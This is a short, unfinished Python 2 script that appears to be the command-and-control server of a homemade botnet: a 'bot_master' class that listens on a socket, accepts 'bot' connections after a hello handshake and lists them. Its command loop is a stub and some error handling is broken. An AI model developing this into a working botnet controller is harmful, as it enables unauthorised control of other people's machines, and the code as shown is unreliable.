#!/usr/bin/env python

import socket
import time
import sys

from common import *

MAX_BACKLOG = 4

class botlist:
	def __init__(self, conn, addr):
		self.conn = conn
		self.addr = addr


class bot_master:
	
	sock = None

	def __init__(self):
		self.botlist = []
		pass;
	
	def run(self, manually = False):
		if (self.start_listen() == False):
			return;

		#FIXME: there need to write some 
		# fork/exec functions
		D("print '[+] try to catch connections...'");
		
		(conn, addr) = self.sock.accept()

		self.botlist.append(botlist(conn, addr))
		
		if (manually == True):
			self.get_cli(conn)
		else:
			print "write automatic functions plz"
			return False;

	
	def get_cli(self, sock):
		sock.setblocking(1);

		try:	ack = sock.recv(PACK_SZ, socket.MSG_DONTWAIT)
		except Exception as err:	
			D('print "recv hello fail"');
			print err;
			return False;
		if ack != HELLO_MSG:
			print '[-] HELLO message incorrect'
			print 'ack = %s' % ack
			return False;

		print "[+] ack recieved"
		
		sock.sendall(HELLO_ACK)

		while True:
			try:
				sys.stdout.write("bot >> ");
				break;
			except:
				D('print "send fail"');
				return False;
				

		pass;

	def start_listen(self):
		if self.sock != None:
			D("print 'listening already inited...'")
			return False;
		try:
			self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
		except:
			D('print "netbot init connection fail:("')
			print err;
			self.sock = None;
			return False;
		D("print '[+]socket.socket success'")
		
		co = (SERV_IP, SERV_PORT)
		try: self.sock.bind(co);
		except Exception as err: 
			D("print '[-] socket.bind failed'");
			print err;
			self.stop_listen();
			return False;
		D("print '[+]socket.bind success'")

		self.sock.listen(MAX_BACKLOG)

		D("print '[+]socket.listen success'")
		return True

	def stop_listen(self):
		if self.sock != None:
			self.sock.close()
		self.sock = None
		pass;
	
	def traverse(self, func):
		for bot in self.botlist:
			func(bot)

	def print_botlist(self):
		for bot in self.botlist:
			print "bot ip = %s port = %d" % (bot.addr[0], bot.addr[1])


def test_master():
	"""
	simple testing routine
	"""
	
	mymaster = bot_master()
	mymaster.run(manually = True)
	mymaster.print_botlist();
	
	del(mymaster)

if __name__ == "__main__":
	test_master()
